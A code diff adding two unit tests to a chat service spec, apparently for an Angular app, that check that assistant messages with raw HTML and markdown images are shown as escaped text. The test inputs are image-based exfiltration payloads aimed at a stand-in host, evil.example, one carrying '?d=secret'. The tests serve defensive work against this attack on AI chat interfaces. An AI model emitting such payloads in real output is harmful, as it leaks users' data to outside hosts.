@@ -146,4 +146,37 @@ describe('ChatService', () => {
         expect(socket.listeners['close']).toBeUndefined();
         expect(snackbar.open).not.toHaveBeenCalled();
     });
+
+    it('should show images and raw HTML from the assistant as text', () => {
+        spectator.service.startChat();
+        const socket = FakeSocket.instances[0];
+        socket.onmessage({
+            data: JSON.stringify({
+                type: 'response',
+                message:
+                    '**Hi** ![<b>x</b>](https://evil.example/?d=1) <img src="https://evil.example/">',
+            }),
+        } as MessageEvent);
+        const [message] = spectator.service.messages();
+        expect(message.content).toContain('<strong>Hi</strong>');
+        expect(message.content).not.toContain('<img');
+        expect(message.content).not.toContain('<b>');
+        expect(message.content).toContain('&lt;img src=');
+    });
+
+    it('should not render HTML that follows an inline code tag', () => {
+        spectator.service.startChat();
+        FakeSocket.instances[0].onmessage({
+            data: JSON.stringify({
+                type: 'response',
+                message:
+                    'hi <code><img/src=//evil.example/?d=secret></code> & ![Tom & Jerry](x.png)',
+            }),
+        } as MessageEvent);
+        const [message] = spectator.service.messages();
+        expect(message.content).not.toContain('<img');
+        expect(message.content).not.toContain('<code>');
+        expect(message.content).toContain('Tom &amp; Jerry');
+        expect(message.content).not.toContain('&amp;amp;');
+    });
 });
